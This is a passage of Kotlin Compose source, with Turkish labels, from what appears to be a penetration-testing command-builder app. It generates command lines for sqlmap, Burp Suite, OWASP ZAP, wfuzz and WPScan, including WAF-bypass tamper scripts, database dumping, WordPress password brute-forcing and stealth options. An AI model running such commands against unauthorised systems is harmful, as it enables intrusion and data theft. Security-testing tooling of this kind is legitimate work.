        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = level,
                onValueChange = { level = it },
                label = { Text("Level (1-5)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = riskLevel,
                onValueChange = { riskLevel = it },
                label = { Text("Risk (1-3)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--tamper=$tamperScript WAF Atlatma Scripti", checked = enableTamper, onCheckedChange = { enableTamper = it })
        if (enableTamper) {
            OutlinedTextField(
                value = tamperScript,
                onValueChange = { tamperScript = it },
                label = { Text("Tamper Scripti (space2comment, between, charencode)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }
        ToggleOption(label = "--batch Sorulara Otomatik Varsayılan Cevap Ver", checked = batchMode, onCheckedChange = { batchMode = it })
        ToggleOption(label = "--random-agent Rastgele User-Agent Kullan", checked = randomAgent, onCheckedChange = { randomAgent = it })
        ToggleOption(label = "--hex Verileri Onaltılık Format ile Çek (Truncation Önlemi)", checked = hexEncoding, onCheckedChange = { hexEncoding = it })
        ToggleOption(label = "--flush-session Önceki Tarama Oturumunu Temizle", checked = flushSession, onCheckedChange = { flushSession = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("sqlmap")
        if (isRequestFile) parts.addAll(listOf("-r", target.trim())) else parts.addAll(listOf("-u", "\"${target.trim()}\""))
        if (testParam.isNotBlank()) parts.addAll(listOf("-p", testParam.trim()))

        val techStr = buildString {
            if (techB) append("B")
            if (techE) append("E")
            if (techU) append("U")
            if (techS) append("S")
            if (techT) append("T")
            if (techQ) append("Q")
        }
        if (techStr.isNotBlank() && techStr != "BEUST") parts.addAll(listOf("--technique", techStr))

        parts.addAll(listOf("--level=$level", "--risk=$riskLevel", "--threads=$threads"))
        parts.add(action)

        if (dbms.isNotBlank() && dbms.lowercase() != "all") parts.add("--dbms=\"${dbms.trim()}\"")
        if (dbName.isNotBlank()) parts.addAll(listOf("-D", dbName.trim()))
        if (tableName.isNotBlank()) parts.addAll(listOf("-T", tableName.trim()))
        if (columnName.isNotBlank()) parts.addAll(listOf("-C", columnName.trim()))
        if (enableTamper && tamperScript.isNotBlank()) parts.add("--tamper=$tamperScript")
        if (batchMode) parts.add("--batch")
        if (randomAgent) parts.add("--random-agent")
        if (hexEncoding) parts.add("--hex")
        if (flushSession) parts.add("--flush-session")
        if (useProxy && proxyUrl.isNotBlank()) parts.add("--proxy=\"${proxyUrl.trim()}\"")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 23. BURP SUITE
@Composable
fun BurpSuiteBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("gui") }
    var projectFile by remember { mutableStateOf("project.burp") }
    var configFile by remember { mutableStateOf("") }
    var userConfigFile by remember { mutableStateOf("") }
    var maxMemory by remember { mutableStateOf("4g") }
    var listenPort by remember { mutableStateOf("8080") }
    var listenInterface by remember { mutableStateOf("127.0.0.1") }
    var collaboratorConfig by remember { mutableStateOf("") }
    var disableExtensions by remember { mutableStateOf(false) }
    var unthrottled by remember { mutableStateOf(true) }

    Column {
        Text(text = "ÇALIŞTIRMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("gui" to "Grafik Arayüz (GUI)", "headless" to "Başsız / Headless", "collaborator" to "Özel Collaborator").forEach { (m, lbl) ->
                val isSelected = mode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { mode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))
        if (mode == "gui" || mode == "headless") {
            OutlinedTextField(
                value = projectFile,
                onValueChange = { projectFile = it },
                label = { Text("Proje Dosyası (--project-file)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = configFile,
                    onValueChange = { configFile = it },
                    label = { Text("Proje Ayarları (--config-file)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                OutlinedTextField(
                    value = maxMemory,
                    onValueChange = { maxMemory = it },
                    label = { Text("Bellek Sınırı (-Xmx4g)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
            }
        } else {
            OutlinedTextField(
                value = collaboratorConfig,
                onValueChange = { collaboratorConfig = it },
                label = { Text("Collaborator Konfigürasyon Dosyası") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "DİNLENEN ARAYÜZ VE GÜVENLİK", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = listenInterface,
                onValueChange = { listenInterface = it },
                label = { Text("Arayüz (127.0.0.1)") },
                modifier = Modifier.weight(1.2f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = listenPort,
                onValueChange = { listenPort = it },
                label = { Text("Port (8080)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--disable-extensions Eklentileri (BApp) Devre Dışı Başlat", checked = disableExtensions, onCheckedChange = { disableExtensions = it })
        ToggleOption(label = "--unthrottled Intruder Hız Limitini Kaldır (Burp Pro)", checked = unthrottled, onCheckedChange = { unthrottled = it })

        // Live Command Synthesis
        val parts = mutableListOf("burpsuite")
        if (mode == "headless") {
            parts.add("--headless")
        } else if (mode == "collaborator") {
            parts.addAll(listOf("--collaborator-server", "--collaborator-config=${collaboratorConfig.trim()}"))
        }

        if (mode != "collaborator") {
            if (projectFile.isNotBlank()) parts.add("--project-file=${projectFile.trim()}")
            if (configFile.isNotBlank()) parts.add("--config-file=${configFile.trim()}")
            if (userConfigFile.isNotBlank()) parts.add("--user-config-file=${userConfigFile.trim()}")
            if (disableExtensions) parts.add("--disable-extensions")
            if (unthrottled) parts.add("--unthrottled")
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 24. OWASP ZAP
@Composable
fun OwaspZapBuilder(language: AppLanguage) {
    var targetUrl by remember { mutableStateOf("https://target.com") }
    var scanType by remember { mutableStateOf("baseline") }
    var apiFormat by remember { mutableStateOf("openapi") }
    var apiSpecUrl by remember { mutableStateOf("") }
    var maxDurationMins by remember { mutableStateOf("15") }
    var ajaxSpider by remember { mutableStateOf(true) }
    var alphaRules by remember { mutableStateOf(false) }
    var reportFormat by remember { mutableStateOf("html") }
    var outputFile by remember { mutableStateOf("zap_report") }
    var daemonPort by remember { mutableStateOf("8080") }

    Column {
        Text(text = "ZAP OTOMASYON VE TARAMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("baseline" to "Temel (Baseline)", "full" to "Tam Aktif (Full)", "api" to "API Test (OpenAPI)", "daemon" to "Arka Plan (Daemon)").forEach { (st, lbl) ->
                val isSelected = scanType == st
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = st }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(
            value = targetUrl,
            onValueChange = { targetUrl = it },
            label = { Text("Hedef URL (-t https://target.com)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        if (scanType == "api") {
            Spacer(modifier = Modifier.height(6.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                listOf("openapi", "graphql", "soap").forEach { f ->
                    val sel = apiFormat == f
                    Box(
                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { apiFormat = f }.padding(vertical = 5.dp),
                        contentAlignment = Alignment.Center
                    ) { Text(text = f.uppercase(), fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
                }
            }
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = apiSpecUrl,
                onValueChange = { apiSpecUrl = it },
                label = { Text("API Tanım Dosyası URL / Dosya Yolu") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAYICI VE KURAL SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-j AJAX Spider ile JavaScript Render Et (SPA Siteleri)", checked = ajaxSpider, onCheckedChange = { ajaxSpider = it })
        ToggleOption(label = "-a Deneysel / Alpha Aktif Tarama Kurallarını Dahil Et", checked = alphaRules, onCheckedChange = { alphaRules = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "RAPORLAMA FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("html" to "HTML (-r)", "md" to "Markdown (-w)", "xml" to "XML (-x)", "json" to "JSON (-J)").forEach { (f, lbl) ->
                val isSelected = reportFormat == f
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { reportFormat = f }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf<String>()
        when (scanType) {
            "baseline" -> {
                parts.addAll(listOf("zap-baseline.py", "-t", targetUrl.trim()))
                if (ajaxSpider) parts.add("-j")
                if (alphaRules) parts.add("-a")
                when (reportFormat) {
                    "html" -> parts.addAll(listOf("-r", "${outputFile.trim()}.html"))
                    "md" -> parts.addAll(listOf("-w", "${outputFile.trim()}.md"))
                    "xml" -> parts.addAll(listOf("-x", "${outputFile.trim()}.xml"))
                    "json" -> parts.addAll(listOf("-J", "${outputFile.trim()}.json"))
                }
            }
            "full" -> {
                parts.addAll(listOf("zap-full-scan.py", "-t", targetUrl.trim()))
                if (ajaxSpider) parts.add("-j")
                if (alphaRules) parts.add("-a")
                parts.addAll(listOf("-m", maxDurationMins.trim()))
                when (reportFormat) {
                    "html" -> parts.addAll(listOf("-r", "${outputFile.trim()}.html"))
                    "md" -> parts.addAll(listOf("-w", "${outputFile.trim()}.md"))
                    "xml" -> parts.addAll(listOf("-x", "${outputFile.trim()}.xml"))
                    "json" -> parts.addAll(listOf("-J", "${outputFile.trim()}.json"))
                }
            }
            "api" -> {
                parts.addAll(listOf("zap-api-scan.py", "-t", if (apiSpecUrl.isNotBlank()) apiSpecUrl.trim() else targetUrl.trim(), "-f", apiFormat))
                when (reportFormat) {
                    "html" -> parts.addAll(listOf("-r", "${outputFile.trim()}.html"))
                    "md" -> parts.addAll(listOf("-w", "${outputFile.trim()}.md"))
                    "xml" -> parts.addAll(listOf("-x", "${outputFile.trim()}.xml"))
                    "json" -> parts.addAll(listOf("-J", "${outputFile.trim()}.json"))
                }
            }
            "daemon" -> {
                parts.addAll(listOf("zap.sh", "-daemon", "-host", "0.0.0.0", "-port", daemonPort.trim(), "-config", "api.disablekey=true"))
            }
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 25. WFUZZ
@Composable
fun WfuzzBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com/page?param=FUZZ") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dirb/common.txt") }
    var payloadEncoder by remember { mutableStateOf("none") }
    var httpMethod by remember { mutableStateOf("GET") }
    var postData by remember { mutableStateOf("") }
    var hideCode by remember { mutableStateOf("404,500") }
    var showCode by remember { mutableStateOf("200,301,302,401,403") }
    var hideLines by remember { mutableStateOf("") }
    var hideWords by remember { mutableStateOf("") }
    var hideChars by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("40") }
    var colorize by remember { mutableStateOf(true) }
    var followRedirects by remember { mutableStateOf(true) }
    var customHeader by remember { mutableStateOf("") }
    var cookie by remember { mutableStateOf("") }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("127.0.0.1:8080:HTTP") }
    var outputFormat by remember { mutableStateOf("json") }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("Hedef URL (FUZZ enjeksiyon noktası ile)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Wordlist Yolu") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("GET", "POST", "PUT", "DELETE").forEach { m ->
                val sel = httpMethod == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { httpMethod = m }.padding(vertical = 5.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = m, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        if (httpMethod != "GET") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = postData,
                onValueChange = { postData = it },
                label = { Text("POST Verisi (-d 'user=FUZZ&pass=test')") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE GİZLEME (--hc / --sc)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = hideCode,
                onValueChange = { hideCode = it },
                label = { Text("Gizle Kod (--hc)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = showCode,
                onValueChange = { showCode = it },
                label = { Text("Göster Kod (--sc)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = hideChars,
                onValueChange = { hideChars = it },
                label = { Text("Karakter (--hh)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AĞ VE PROXY AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-c Renkli Terminal Çıktısı", checked = colorize, onCheckedChange = { colorize = it })
        ToggleOption(label = "-L Yönlendirmeleri Takip Et (Follow Redirects)", checked = followRedirects, onCheckedChange = { followRedirects = it })
        ToggleOption(label = "Proxy Kullan (-p $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val payloadSpec = if (payloadEncoder != "none") "file,$wordlist,$payloadEncoder" else "file,$wordlist"
        val parts = mutableListOf("wfuzz", "-z", payloadSpec)
        if (httpMethod != "GET") parts.addAll(listOf("-X", httpMethod))
        if (postData.isNotBlank()) parts.addAll(listOf("-d", "\"${postData.trim()}\""))

        if (hideCode.isNotBlank()) parts.addAll(listOf("--hc", hideCode.trim()))
        if (showCode.isNotBlank()) parts.addAll(listOf("--sc", showCode.trim()))
        if (hideChars.isNotBlank()) parts.addAll(listOf("--hh", hideChars.trim()))
        if (hideLines.isNotBlank()) parts.addAll(listOf("--hl", hideLines.trim()))
        if (hideWords.isNotBlank()) parts.addAll(listOf("--hw", hideWords.trim()))
        if (colorize) parts.add("-c")
        if (followRedirects) parts.add("-L")
        if (customHeader.isNotBlank()) parts.addAll(listOf("-H", "\"${customHeader.trim()}\""))
        if (cookie.isNotBlank()) parts.addAll(listOf("-b", "\"${cookie.trim()}\""))
        if (useProxy && proxyUrl.isNotBlank()) parts.addAll(listOf("-p", proxyUrl.trim()))
        if (outputFormat != "none") parts.addAll(listOf("-f", "wfuzz_results.$outputFormat,$outputFormat"))
        parts.addAll(listOf("-t", threads.trim(), url.trim()))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 26. WPSCAN
@Composable
fun WPScanBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com") }
    var detectionMode by remember { mutableStateOf("mixed") }
    var apiToken by remember { mutableStateOf("") }

    // Enumeration Çipleri
    var enumVulnPlugins by remember { mutableStateOf(true) }
    var enumAllPlugins by remember { mutableStateOf(false) }
    var enumVulnThemes by remember { mutableStateOf(true) }
    var enumAllThemes by remember { mutableStateOf(false) }
    var enumUsers by remember { mutableStateOf(true) }
    var enumBackups by remember { mutableStateOf(true) }
    var enumDbExports by remember { mutableStateOf(true) }

    // Parola Kırma
    var enableBruteForce by remember { mutableStateOf(false) }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var usernames by remember { mutableStateOf("admin,editor") }

    // Bayraklar
    var randomAgent by remember { mutableStateOf(true) }
    var stealthy by remember { mutableStateOf(false) }
    var disableTlsChecks by remember { mutableStateOf(true) }
    var useProxy by remember { mutableStateOf(false) }
    var proxyUrl by remember { mutableStateOf("http://127.0.0.1:8080") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = url,
            onValueChange = { url = it },
            label = { Text("WordPress Hedef URL (--url https://...)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = apiToken,
            onValueChange = { apiToken = it },
            label = { Text("WPVulnerability API Token (--api-token: opsiyonel)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TESPİT MODU (--detection-mode)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("mixed" to "Karma (Mixed)", "passive" to "Pasif (Passive)", "aggressive" to "Agresif (Aggressive)").forEach { (dm, lbl) ->
                val isSelected = detectionMode == dm
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { detectionMode = dm }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "NUMARALANDIRMA SEÇENEKLERİ (-e)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Vuln Plugins (vp)", enumVulnPlugins, modifier = Modifier.weight(1f)) { enumVulnPlugins = !enumVulnPlugins }
            ToggleChip("All Plugins (ap)", enumAllPlugins, modifier = Modifier.weight(1f)) { enumAllPlugins = !enumAllPlugins }
            ToggleChip("Vuln Themes (vt)", enumVulnThemes, modifier = Modifier.weight(1f)) { enumVulnThemes = !enumVulnThemes }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("Users (u1-50)", enumUsers, modifier = Modifier.weight(1f)) { enumUsers = !enumUsers }
            ToggleChip("Config Backups (cb)", enumBackups, modifier = Modifier.weight(1f)) { enumBackups = !enumBackups }
            ToggleChip("DB Exports (dbe)", enumDbExports, modifier = Modifier.weight(1f)) { enumDbExports = !enumDbExports }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "KULLANICI PAROLA KABA KUVVETİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "Parola Sözlük Saldırısı Yap (--passwords)", checked = enableBruteForce, onCheckedChange = { enableBruteForce = it })
        if (enableBruteForce) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = usernames,
                    onValueChange = { usernames = it },
                    label = { Text("Kullanıcılar (-U)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                OutlinedTextField(
                    value = wordlist,
                    onValueChange = { wordlist = it },
                    label = { Text("Wordlist (-P)") },
                    modifier = Modifier.weight(1.5f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
            }
            Spacer(modifier = Modifier.height(6.dp))
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "BAYRAKLAR VE GİZLİLİK", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--random-user-agent Rastgele Tarayıcı Kimliği Kullan", checked = randomAgent, onCheckedChange = { randomAgent = it })
        ToggleOption(label = "--stealthy Sessiz ve Yavaş İstek Gönder", checked = stealthy, onCheckedChange = { stealthy = it })
        ToggleOption(label = "--disable-tls-checks SSL Sertifika Kontrollerini Atla", checked = disableTlsChecks, onCheckedChange = { disableTlsChecks = it })
        ToggleOption(label = "Proxy Kullan (--proxy $proxyUrl)", checked = useProxy, onCheckedChange = { useProxy = it })
        if (useProxy) {
            OutlinedTextField(
                value = proxyUrl,
                onValueChange = { proxyUrl = it },
                label = { Text("Proxy Adresi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("wpscan", "--url", url.trim())
        val enums = mutableListOf<String>()
        if (enumUsers) enums.add("u")
        if (enumVulnPlugins && !enumAllPlugins) enums.add("vp")
        if (enumAllPlugins) enums.add("ap")
        if (enumVulnThemes && !enumAllThemes) enums.add("vt")
        if (enumAllThemes) enums.add("at")
        if (enumBackups) enums.add("cb")
        if (enumDbExports) enums.add("dbe")
        if (enums.isNotEmpty()) parts.addAll(listOf("-e", enums.joinToString(",")))

        if (detectionMode != "mixed") parts.addAll(listOf("--detection-mode", detectionMode))
        if (outputFormat != "cli") parts.addAll(listOf("-f", outputFormat, "-o", "wpscan_report.$outputFormat"))
        if (apiToken.isNotBlank()) parts.addAll(listOf("--api-token", apiToken.trim()))
        if (enableBruteForce) {
            parts.addAll(listOf("-U", usernames.trim(), "-P", wordlist.trim()))
        }
        if (randomAgent) parts.add("--random-user-agent")
        if (stealthy) parts.add("--stealthy")
        if (disableTlsChecks) parts.add("--disable-tls-checks")
